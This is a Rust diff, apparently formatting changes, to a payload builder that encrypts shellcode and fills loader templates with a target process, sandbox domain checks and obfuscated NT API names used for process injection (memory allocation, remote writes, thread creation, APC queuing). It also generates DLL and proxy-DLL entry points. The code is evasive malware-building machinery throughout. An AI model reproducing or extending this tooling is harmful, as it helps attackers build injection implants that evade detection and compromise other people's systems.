@@ -24,7 +24,11 @@ fn build_dependencies(template_dependencies: Option<String>) -> String {
     }
 }
 
-fn search_and_replace(path: &Path, search: &str, replace: &str) -> Result<(), Box<dyn std::error::Error>> {
+fn search_and_replace(
+    path: &Path,
+    search: &str,
+    replace: &str,
+) -> Result<(), Box<dyn std::error::Error>> {
     let content = fs::read_to_string(path)?;
     let new_content = content.replace(search, replace);
     let mut file = OpenOptions::new().write(true).truncate(true).open(path)?;
@@ -42,7 +46,10 @@ fn create_output_folder() -> Result<PathBuf, Box<dyn std::error::Error>> {
 }
 
 fn copy_template(source: &Path, dest: &Path) -> Result<(), Box<dyn std::error::Error>> {
-    let options = CopyOptions { content_only: true, ..Default::default() };
+    let options = CopyOptions {
+        content_only: true,
+        ..Default::default()
+    };
     copy(source, dest, &options)?;
     Ok(())
 }
@@ -59,15 +66,22 @@ fn get_encrypted_filename(encryption: &Encryption) -> &'static str {
     }
 }
 
-fn build_encrypted_output(order: &Order, src_dir: &Path) -> (crate::encryption::EncryptionOutput, String) {
+fn build_encrypted_output(
+    order: &Order,
+    src_dir: &Path,
+) -> (crate::encryption::EncryptionOutput, String) {
     let filename = get_encrypted_filename(&order.encryption);
     let path = src_dir.join(filename);
     let include_path = format!("\"{}\"", filename);
-    let output = crate::encryption::encrypt_shellcode(&order.shellcode_path, &path, order.encryption);
+    let output =
+        crate::encryption::encrypt_shellcode(&order.shellcode_path, &path, order.encryption);
     (output, include_path)
 }
 
-fn build_basic_replacements(enc_output: crate::encryption::EncryptionOutput, include_path: String) -> HashMap<&'static str, String> {
+fn build_basic_replacements(
+    enc_output: crate::encryption::EncryptionOutput,
+    include_path: String,
+) -> HashMap<&'static str, String> {
     let dependencies = build_dependencies(enc_output.dependencies);
     let mut replacements = HashMap::new();
     replacements.insert("{{PATH_TO_SHELLCODE}}", include_path);
@@ -94,25 +108,49 @@ fn add_sandbox_replacements(replacements: &mut HashMap<&'static str, String>, do
 fn add_api_obfuscation_replacements(replacements: &mut HashMap<&'static str, String>) {
     let key = non_zero_random_key();
     replacements.insert("{{API_KEY}}", format!("0x{:02x}", key));
-    replacements.insert("{{OBF_NT_OPEN_PROCESS}}", obfuscate_api_name("NtOpenProcess", key));
-    replacements.insert("{{OBF_NT_ALLOCATE_VIRTUAL_MEMORY}}", obfuscate_api_name("NtAllocateVirtualMemory", key));
-    replacements.insert("{{OBF_NT_WRITE_VIRTUAL_MEMORY}}", obfuscate_api_name("NtWriteVirtualMemory", key));
-    replacements.insert("{{OBF_NT_PROTECT_VIRTUAL_MEMORY}}", obfuscate_api_name("NtProtectVirtualMemory", key));
-    replacements.insert("{{OBF_NT_CREATE_THREAD_EX}}", obfuscate_api_name("NtCreateThreadEx", key));
-    replacements.insert("{{OBF_NT_QUEUE_APC_THREAD}}", obfuscate_api_name("NtQueueApcThread", key));
-    replacements.insert("{{OBF_NT_TEST_ALERT}}", obfuscate_api_name("NtTestAlert", key));
-    replacements.insert("{{OBF_NT_DELAY_EXECUTION}}", obfuscate_api_name("NtDelayExecution", key));
+    replacements.insert(
+        "{{OBF_NT_OPEN_PROCESS}}",
+        obfuscate_api_name("NtOpenProcess", key),
+    );
+    replacements.insert(
+        "{{OBF_NT_ALLOCATE_VIRTUAL_MEMORY}}",
+        obfuscate_api_name("NtAllocateVirtualMemory", key),
+    );
+    replacements.insert(
+        "{{OBF_NT_WRITE_VIRTUAL_MEMORY}}",
+        obfuscate_api_name("NtWriteVirtualMemory", key),
+    );
+    replacements.insert(
+        "{{OBF_NT_PROTECT_VIRTUAL_MEMORY}}",
+        obfuscate_api_name("NtProtectVirtualMemory", key),
+    );
+    replacements.insert(
+        "{{OBF_NT_CREATE_THREAD_EX}}",
+        obfuscate_api_name("NtCreateThreadEx", key),
+    );
+    replacements.insert(
+        "{{OBF_NT_QUEUE_APC_THREAD}}",
+        obfuscate_api_name("NtQueueApcThread", key),
+    );
+    replacements.insert(
+        "{{OBF_NT_TEST_ALERT}}",
+        obfuscate_api_name("NtTestAlert", key),
+    );
+    replacements.insert(
+        "{{OBF_NT_DELAY_EXECUTION}}",
+        obfuscate_api_name("NtDelayExecution", key),
+    );
 }
 
 fn build_replacements(order: &Order, src_dir: &Path) -> HashMap<&'static str, String> {
     let (enc_output, include_path) = build_encrypted_output(order, src_dir);
     let mut replacements = build_basic_replacements(enc_output, include_path);
     add_target_process_replacement(&mut replacements, &order.target_process);
-    
+
     if let Some(ref domain) = order.sandbox {
         add_sandbox_replacements(&mut replacements, domain);
     }
-    
+
     add_api_obfuscation_replacements(&mut replacements);
     replacements
 }
@@ -141,7 +179,8 @@ fn build_dll_main_function(is_proxy: bool) -> String {
         }
 
         true
-    }"#.to_string()
+    }"#
+        .to_string()
     } else {
         r#"
     const DLL_PROCESS_ATTACH: u32 = 1;
@@ -170,7 +209,8 @@ fn build_dll_main_function(is_proxy: bool) -> String {
     #[no_mangle]
     pub extern "C" fn DllUnregisterServer() { main() }
     #[no_mangle]
-    pub extern "C" fn Run() { main() }"#.to_string()
+    pub extern "C" fn Run() { main() }"#
+            .to_string()
     }
 }
 
@@ -201,13 +241,18 @@ fn apply_replacements(replacements: &HashMap<&str, String>, main_path: &Path, ca
 }
 
 fn find_proxy_insert_position(content: &str) -> usize {
-    content.find("use_litcrypt!();")
+    content
+        .find("use_litcrypt!();")
         .map(|pos| {
             let after = pos + "use_litcrypt!();".len();
-            content[after..].find('\n').map(|n| after + n + 1).unwrap_or(after)
+            content[after..]
+                .find('\n')
+                .map(|n| after + n + 1)
+                .unwrap_or(after)
         })
         .unwrap_or_else(|| {
-            content.lines()
+            content
+                .lines()
                 .take_while(|line| line.trim().starts_with("#!") || line.trim().is_empty())
                 .map(|l| l.len() + 1)
                 .sum::<usize>()
@@ -282,7 +327,7 @@ pub fn assemble(order: Order) -> PathBuf {
 #[cfg(test)]
 mod tests {
     use super::*;
-    use crate::config::{Encryption, Execution, Format};
+    use crate::config::{Encryption, Execution};
 
     #[test]
     fn test_build_dependencies() {
